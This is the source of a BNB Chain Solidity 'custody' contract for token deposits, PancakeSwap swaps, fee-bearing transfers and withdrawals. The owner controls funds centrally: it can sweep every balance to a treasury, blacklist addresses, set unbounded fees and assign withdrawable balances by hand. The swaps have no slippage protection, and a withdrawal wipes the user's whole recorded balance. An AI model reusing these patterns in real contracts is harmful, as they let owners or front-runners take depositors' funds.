/**
 *Submitted for verification at BscScan.com on 2023-02-01
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.11;

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IPancakeFactory {

    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address token0, address token1) external view returns (address);

}


interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
        
}



contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _previousOwner = _owner ;
        _owner = newOwner;
    }

    function previousOwner() public view returns (address) {
        return _previousOwner;
    }
}

contract CoreCustodyContract is Context,Ownable{
   
    using SafeMath for uint256;

    // pancakeswap
     IPancakeRouter02 private pancakeV2Router;
    address public pancakeswapPair;
    address public routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public targetToken = 0x4f4543Fa5F7FE28a7758ef43FeA71d11fCCDAD5c; 
    




    uint public totalDeposit;
    uint public totalHolders;
    uint public platformFee = 150; 
    address [] public holdersList;

    mapping (address => bool) public Tokens;
    address [] public TokensList ;

    mapping (address => uint256) public UserTokens;
    
    mapping(address => bool) private _isBlacklisted;

    bool public _withdrawFlag ;
    bool public _depositFlag ;
    bool public _directTransferFlag ;
    bool public _userBalanceUpdate ;
    
    address public treasury = 0xd3163724D1AB51468c1917CCf8B66E6C4d3c580A;
    event TransferAllTokenToTreasuryEvent(address indexed token,address indexed treasury, uint256 value,uint256 timestamp);

    event UserTokenBalanceUpdateEvent(address indexed user,uint256 value,uint256 timestamp);

    event DepositTokenEvent(address indexed token,address indexed from, address indexed to, uint256 value);
    event WithdrawTokenEvent(address indexed token,address indexed from, address indexed to, uint256 value);

    event FailedWithdrawTokenEvent(address indexed token,address indexed from, address indexed to, uint256 value,uint256 contractTokenBalance);

    event DirectTransferEvent(address indexed token,address indexed from, address indexed to,uint256 actual_value ,uint256 value_after_deduction,uint256 value_after_platformfee,uint256 platformfee_value);
    event DirectTransferEvent2(address indexed token,address indexed from, address indexed to,uint256 actual_value ,uint256 value_after_platformfee,uint256 platformfee_value);

    
    constructor(address _token){
        Tokens[_token] = true;
        TokensList.push(_token);
        _withdrawFlag = true;
        _depositFlag = true;
        _directTransferFlag = true;
        _userBalanceUpdate = true;
        // pancakeswap
        IPancakeRouter02 _pancakeV2Router = IPancakeRouter02(routerAddress);
        pancakeV2Router = _pancakeV2Router;
        // pancakeswapPair = IPancakeFactory(pancakeV2Router.factory()).createPair(address(this), pancakeV2Router.WETH());


    }

       function setTargetAddress(address target_adr) external onlyOwner {
        targetToken = target_adr;
    }

     function swapTokenfortargetToken(IBEP20 from_token,uint amountIn) private {
        address[] memory path = new address[](2);
        path[0] = address(from_token);
        path[1] = address(targetToken);
        from_token.transferFrom(msg.sender,address(this), amountIn);
        from_token.approve(address(pancakeV2Router), amountIn);   
        pancakeV2Router.swapExactTokensForTokens(amountIn,0,path,address(this),block.timestamp);
    }   

    modifier AllowedTokenCheck(IBEP20 _token){
        require(Tokens[address(_token)],'This Token is not allowed to deposit and withdraw.');
        _;
    }

    function setWithdrawalFlag(bool _bool) external onlyOwner {
        _withdrawFlag = _bool;
    }

function setPlatformFee(uint _platformFee) external onlyOwner {
        platformFee = _platformFee;
    }
    function setDepositFlag(bool _bool) external onlyOwner {
        _depositFlag = _bool;
    }

    function setDirectTransferFlag(bool _bool) external onlyOwner {
        _directTransferFlag = _bool;
    }

    function setUserBalanceUpdate(bool _bool) external onlyOwner {
        _userBalanceUpdate = _bool;
    }


    function setAddressIsBlackListed(address _address, bool _bool) external onlyOwner {
        _isBlacklisted[_address] = _bool;
    }

    function viewIsBlackListed(address _address) public view returns(bool) {
        return _isBlacklisted[_address];
    }

    function allowedTokens(address _token,bool _flag) public onlyOwner{
        Tokens[_token] = _flag;
        TokensList.push(_token);
    }

   
    function checkTokenAllowances(IBEP20 _token) public view returns(uint256){
        uint256 allowance = _token.allowance(msg.sender, address(this));
        return allowance;
    }
    
    function depositToken(IBEP20 _token,uint _amount) public AllowedTokenCheck(_token){
        require(_amount > 0, "You need to deposit at least some tokens");
        require(_depositFlag,"Deposit is not allowed");


        uint _before_token_balance = _token.balanceOf(address(this));

        _token.transferFrom(msg.sender,address(this), _amount);
        uint _after_token_balance = _token.balanceOf(address(this));
        uint _new_amount = _after_token_balance.sub(_before_token_balance);


        emit DepositTokenEvent(address(_token),msg.sender,address(this), _new_amount);
    }
    

    function getCurrentUser() public view returns(address)
    {
        return msg.sender;   
    }
    
    function withdrawToken(IBEP20 _token,uint _amount) public AllowedTokenCheck(_token){
        require(_amount > 0, "You need to withdraw at least some tokens");
        require(!_isBlacklisted[msg.sender],"Your Address is blacklisted");
        require(_withdrawFlag,"Withdraw is not allowed");
        if (UserTokens[msg.sender] >= _amount){
        _token.transfer(msg.sender, _amount);
        emit WithdrawTokenEvent(address(_token),msg.sender,address(this), _amount);
        UserTokens[msg.sender] = 0;
        }
        else{
            emit FailedWithdrawTokenEvent(address(_token),msg.sender,address(this), _amount,_token.balanceOf(address(this)));
        }
    }



    function updateUserTokenBalnce(address _address,uint _amount) public onlyOwner{
        require(_amount > 0, "You need to amount at least some tokens");
        require(!_isBlacklisted[msg.sender],"Your Address is blacklisted");
        require(_userBalanceUpdate,"User Balance update is not allowed");

        UserTokens[_address] = _amount;

        emit UserTokenBalanceUpdateEvent(_address, _amount,block.timestamp);

    }

    function TransferAllTokenToTreasury(IBEP20 _token) public onlyOwner AllowedTokenCheck(_token){

        uint _contract_balance = _token.balanceOf(address(this));
        require(_contract_balance > 0, "Contract not have any token balance to transfer.");
        
        _token.transfer(treasury, _contract_balance);
        emit TransferAllTokenToTreasuryEvent(address(_token),treasury, _contract_balance,block.timestamp);
    
    }

    function DirectTransfer(IBEP20 _token,address _address,uint _amount) public AllowedTokenCheck(_token){
        require(_amount > 0, "You need to deposit at least some tokens");
        require(_directTransferFlag,"Direct Transfer is not allowed");
        require(!_isBlacklisted[msg.sender],"Your Address is blacklisted");
        require(!_isBlacklisted[_address],"Receiver Address is blacklisted");

        IBEP20 _target_token = IBEP20(targetToken);
        
        uint _before_token_balance = _target_token.balanceOf(address(this));

        if(targetToken != address(_token)){
            swapTokenfortargetToken(_token,_amount);
        }else{
        _token.transferFrom(msg.sender,address(this), _amount);
        }
   

        uint _after_token_balance = _target_token.balanceOf(address(this));

        uint _new_amount = _after_token_balance.sub(_before_token_balance);

        uint _platformfee_value = _new_amount.mul(platformFee).div(10000);
        uint _transfer_value = _new_amount.sub(_platformfee_value);

        _target_token.transfer(_address, _transfer_value);

        emit DirectTransferEvent(address(_token),msg.sender,_address,_amount,_new_amount,_transfer_value,_platformfee_value);
    }
    


    function DirectTransfer2(IBEP20 _token,address _address,uint _amount) public AllowedTokenCheck(_token){
        require(_amount > 0, "You need to deposit at least some tokens");
        require(_directTransferFlag,"Direct Transfer is not allowed");
        require(!_isBlacklisted[msg.sender],"Your Address is blacklisted");
        require(!_isBlacklisted[_address],"Receiver Address is blacklisted");

        
        uint _platformfee_value = _amount.mul(platformFee).div(10000);
        uint _transfer_value = _amount.sub(_platformfee_value);
        
        _token.transferFrom(msg.sender,_address, _transfer_value);
        _token.transferFrom(msg.sender,address(this), _platformfee_value);

        emit DirectTransferEvent2(address(_token),msg.sender,_address,_amount,_transfer_value,_platformfee_value);
    }

    receive() external payable {}


}